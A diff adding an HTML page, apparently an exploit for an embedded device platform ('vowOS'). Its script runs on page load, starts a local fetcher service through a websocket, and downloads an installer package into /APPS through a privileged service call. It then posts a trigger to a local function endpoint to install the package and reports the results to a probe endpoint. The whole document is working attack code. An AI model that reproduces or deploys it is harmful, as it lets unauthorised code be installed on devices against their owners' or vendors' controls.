@@ -1,0 +1,32 @@
+<html><head><meta charset="utf-8"><title>arm9 adsfw</title></head>
+<body><pre id="out">arm9…</pre><script>
+(function(){
+ "use strict";
+ var report={started:new Date().toISOString(),steps:{}};
+ function save(){try{var x=new XMLHttpRequest();x.open("POST","/api/probe",true);x.setRequestHeader("Content-Type","application/json");x.send(JSON.stringify(report));}catch(e){}}
+ function line(t){document.getElementById("out").textContent+=t+"\n";}
+ function syncExec(svc,obj){try{return vowOS.service.syncExecute(svc,obj);}catch(e){return{ret:false,msg:"EXC "+e.message};}}
+ var BASE=location.origin+"/pub/";
+ var FN="http://localhost:9009/function/basic/fetch/alvarm2";
+ function startFetcher(){return new Promise(function(res){var done=false;function fin(v){if(!done){done=true;res(v);}}
+   try{var ws=new WebSocket("wss://localhost:9888");
+     ws.onopen=function(){ws.send(JSON.stringify({path:"phoenix://service/basic/fetcher",method:"start",parameters:{},session:901,timeout:10}));setTimeout(function(){try{ws.close();}catch(e){}fin("ok");},1200);};
+     ws.onerror=function(){fin("ws err");};setTimeout(function(){fin("timeout");},5000);
+   }catch(e){fin("EXC "+e.message);}});}
+ setTimeout(function(){
+  startFetcher().then(function(){
+   setTimeout(function(){
+    report.steps.ipk=syncExec("basic/fetcher",{api:"fetchFile",args:JSON.stringify({url:BASE+"installer_c.ipk",directory:"/APPS/installer.ipk",permission:420})});
+    line("ipk: "+JSON.stringify(report.steps.ipk));
+    setTimeout(function(){
+      var L=[{item:"34:54:34;re.installer"},{item:"35:53:35;/APPS/installer.ipk;re.installer;"}];
+      var x=new XMLHttpRequest();x.open("POST",FN,true);x.setRequestHeader("Content-Type","application/json");
+      x.onload=function(){report.steps.trigger=String(x.responseText||"").slice(0,2500);line("trigger: "+report.steps.trigger.slice(0,500));setTimeout(save,1500);};
+      x.onerror=function(){save();};
+      x.send(JSON.stringify({list:L}));
+    },2000);
+   },2000);
+  });
+ },300);
+})();
+</script></body></html>
